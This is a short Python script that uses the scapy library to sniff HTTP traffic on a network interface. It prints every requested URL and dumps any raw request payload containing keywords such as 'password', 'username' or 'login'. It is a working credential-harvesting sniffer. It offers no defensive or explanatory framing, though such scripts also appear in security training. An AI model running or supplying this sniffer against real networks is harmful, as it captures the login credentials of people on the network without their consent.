import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    # prn -> callback function
    # store -> store in Memory
    # prn -> each packet is processed by the other function
    # filter -> protocols/ prot no.
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    load = packet[scapy.Raw].load
    keywords = ["pass", "password", "uname", "username", "login"]
    for i in keywords:
        if i in str(load):
            print(load)
            break


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url)
        if packet.haslayer(scapy.Raw):
            get_login_info(packet)


sniff("eth0")
